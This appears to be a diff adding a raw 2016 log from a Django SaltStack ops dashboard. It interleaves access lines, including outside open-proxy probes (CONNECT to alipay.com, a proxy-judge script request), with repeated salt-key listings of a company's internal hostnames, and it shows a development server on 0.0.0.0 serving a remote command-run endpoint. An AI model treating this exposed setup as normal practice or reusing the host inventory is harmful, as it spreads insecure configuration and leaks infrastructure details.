+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.co[21/May/2016 16:57:06] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10107
+[21/May/2016 16:57:52] "GET /index/ HTTP/1.1" 200 9338
+[21/May/2016 16:57:55] "GET /deploy-manage/list_deploy_info/ HTTP/1.1" 200 6528
+[21/May/2016 16:57:58] "GET /deploy-manage/list_deploy_info/ HTTP/1.1" 200 6528
+Not Found: /http:/123.125.114.238/
+[21/May/2016 18:25:59] "GET http://123.125.114.238/ HTTP/1.1" 404 1668
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 19:45:29] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 20:01:51] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.sogou.com/
+[21/May/2016 20:33:00] "GET http://www.sogou.com/?rands=_244817408010732201565872 HTTP/1.1" 404 1692
+Not Found: /http:/www.haosou.com/
+[21/May/2016 20:33:00] "GET http://www.haosou.com/?rands=_1062410507202921940737256 HTTP/1.1" 404 1697
+Not Found: /http:/reg.renren.com/
+[21/May/2016 20:33:01] "GET http://reg.renren.com/?rands=_86807372402966703567232 HTTP/1.1" 404 1695
+Not Found: /http:/m.baidu.com/
+[21/May/2016 20:33:02] "GET http://m.baidu.com/?rands=_1046051125211578143607856 HTTP/1.1" 404 1685
+Not Found: /http:/www.kuaidaili.com/
+[21/May/2016 20:33:03] "GET http://www.kuaidaili.com/?rands=_1250054963015295502954636 HTTP/1.1" 404 1709
+[21/May/2016 20:50:59] "GET / HTTP/1.1" 302 0
+[21/May/2016 20:51:00] "GET /index/ HTTP/1.1" 200 9338
+[21/May/2016 20:51:00] "GET /static/css/sb-admin.css HTTP/1.1" 200 3480
+[21/May/2016 20:51:00] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 21984
+[21/May/2016 20:51:00] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[21/May/2016 20:51:00] "GET /static/img/meitianhui.png HTTP/1.1" 200 7082
+[21/May/2016 20:51:00] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
+[21/May/2016 20:51:00] "GET /static/js/jquery.js HTTP/1.1" 200 95785
+[21/May/2016 20:51:01] "GET /static/js/echarts.js HTTP/1.1" 200 296800
+[21/May/2016 20:51:03] "GET /static/font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 71508
+Not Found: /favicon.ico
+[21/May/2016 20:51:05] "GET /favicon.ico HTTP/1.1" 404 2640
+[21/May/2016 20:51:17] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 8404
+[21/May/2016 20:51:30] "GET /saltstack/hosts/list_app_deploy_info HTTP/1.1" 200 6653
+[21/May/2016 20:51:33] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 8404
+[21/May/2016 20:51:39] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[21/May/2016 20:51:39] "GET /static/img/wait.gif HTTP/1.1" 200 54292
+[21/May/2016 20:51:42] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9873
+[21/May/2016 20:51:45] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9362
+[21/May/2016 20:51:51] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9873
+[21/May/2016 20:52:08] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[21/May/2016 20:52:30] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10478
+m
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - porta[21/May/2016 20:55:52] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9980
+[21/May/2016 20:57:31] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10244
+[21/May/2016 20:57:55] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10241
+l
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:[21/May/2016 20:58:32] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 11651
+[21/May/2016 20:58:54] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 11653
+[21/May/2016 20:59:04] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 12008
+[21/May/2016 21:05:07] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9873
+
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+/usr/local/python2.7/lib/python2.7/site-packages/django/template/loader.py:97: RemovedInDjango110Warning: render() must be called with a dict, not a RequestContext.
+  return template.render(context, request)
+
+[21/May/2016 21:11:05] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9327
+[21/May/2016 21:11:13] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9512
+[21/May/2016 21:11:40] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10293
+[21/May/2016 21:12:01] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10171
+Performing system checks...
+
+System check identified no issues (0 silenced).
+May 21, 2016 - 21:10:56
+Django version 1.9.5, using settings 'ops_system.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supp[21/May/2016 21:12:38] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 11786
+[21/May/2016 21:12:44] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 11735
+[21/May/2016 21:12:50] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 11737
+ly_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supp[21/May/2016 21:12:59] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 237046
+[21/May/2016 21:13:27] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9837
+[21/May/2016 21:14:46] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9837
+[21/May/2016 21:14:46] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[21/May/2016 21:14:47] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[21/May/2016 21:14:47] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[21/May/2016 21:14:52] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[21/May/2016 21:14:58] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9837
+[21/May/2016 21:14:58] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[21/May/2016 21:14:58] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[21/May/2016 21:14:58] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[21/May/2016 21:14:59] "GET /static/js/echarts.js HTTP/1.1" 200 296800
+[21/May/2016 21:15:25] "GET /saltstack/hosts/list_cmd_run_info?page=2 HTTP/1.1" 200 9058
+[21/May/2016 21:15:26] "GET /static/img/meitianhui.png HTTP/1.1" 200 7082
+[21/May/2016 21:15:28] "GET /saltstack/hosts/list_cmd_run_info?page=3 HTTP/1.1" 200 6908
+[21/May/2016 21:15:33] "GET /saltstack/hosts/list_app_deploy_info HTTP/1.1" 200 6653
+Not Found: /http:/www.advalleys.com/azenvaa.php
+[21/May/2016 21:39:29] "GET http://www.advalleys.com/azenvaa.php HTTP/1.0" 404 1709
+Not Found: /www.alipay.com:443
+[21/May/2016 21:39:29] "CONNECT www.alipay.com:443 HTTP/1.0" 404 1661
+Not Found: /search.yahoo.com:443
+[21/May/2016 23:15:20] "CONNECT search.yahoo.com:443 HTTP/1.1" 404 1665
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 23:51:00] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
